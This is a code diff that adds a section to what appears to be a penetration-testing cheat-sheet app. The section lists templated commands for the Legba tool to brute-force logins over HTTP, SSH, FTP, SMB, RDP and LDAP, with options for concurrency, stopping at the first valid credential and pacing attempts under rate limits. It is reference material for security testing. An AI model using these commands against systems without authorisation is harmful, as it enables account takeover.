@@ -155,6 +155,29 @@ const SECTIONS = [
     ]
   },
   {
+    id: 'legba',
+    emoji: '\u{1F510}',
+    title: 'Password — Legba (Multi-Protocol Brute Force)',
+    commands: [
+      { title: 'legba — HTTP login', desc: 'Brute-force HTTP login form', diff: 'medium', code: 'legba http -T <url> -U <user> -P <password_file>' },
+      { title: 'legba — HTTP POST form', desc: 'Custom POST form brute-force', diff: 'hard', code: 'legba http -T <url> --http-method POST --http-payload "Username={{USERNAME}}&Password={{PASSWORD}}" --http-success "status == 302" -U <user_file> -P <password_file>' },
+      { title: 'legba — HTTP Basic Auth', desc: 'Brute-force HTTP Basic Auth', diff: 'medium', code: 'legba http-basic -T <target> -U <user> -P <password_file>' },
+      { title: 'legba — SSH', desc: 'Brute-force SSH password', diff: 'medium', code: 'legba ssh -T <target> -U <user> -P <password_file>' },
+      { title: 'legba — FTP', desc: 'Brute-force FTP credentials', diff: 'medium', code: 'legba ftp -T <target> -U <user> -P <password_file>' },
+      { title: 'legba — SMB', desc: 'Brute-force SMB authentication', diff: 'medium', code: 'legba smb -T <target> -U <user> -P <password_file>' },
+      { title: 'legba — RDP', desc: 'Brute-force Remote Desktop', diff: 'hard', code: 'legba rdp -T <target> -U <user> -P <password_file>' },
+      { title: 'legba — LDAP', desc: 'Brute-force LDAP bind', diff: 'hard', code: 'legba ldap -T <target> -U <user> -P <password_file>' },
+      { title: 'legba — Verbose', desc: 'Detailed progress output', diff: 'medium', code: 'legba http -T <url> -U <user> -P <password_file> -v' },
+      { title: 'legba — Concurrency', desc: 'Set thread count for speed', diff: 'medium', code: 'legba http -T <url> -U <user> -P <password_file> --concurrency <threads>' },
+      { title: 'legba — Stop on success', desc: 'Exit after first valid credential', diff: 'medium', code: 'legba http -T <url> -U <user> -P <password_file> --single-match' },
+      { title: 'legba — Custom failure', desc: 'Detect failure by response text', diff: 'hard', code: 'legba http -T <url> --http-success "status != 200" -U <user> -P <password_file>' },
+      { title: 'legba — Save output', desc: 'Write results to file', diff: 'medium', code: 'legba http -T <url> -U <user> -P <password_file> -O <output>' },
+      { title: 'legba — Proxy', desc: 'Route through Burp/socks proxy', diff: 'hard', code: 'legba http -T <url> -U <user> -P <password_file> --proxy http://<ip>:<port>' },
+      { title: 'legba — Rate limit delay', desc: 'Add delay between attempts', diff: 'hard', code: 'legba ssh -T <target> -U <user> -P <password_file> -W <milliseconds>' },
+      { title: 'legba — Resume session', desc: 'Continue interrupted attack', diff: 'hard', code: 'legba ssh --resume <session_file>' },
+    ]
+  },
+  {
     id: 'shells',
     emoji: '\u{1F41A}',
     title: 'Reverse Shells & Listeners',
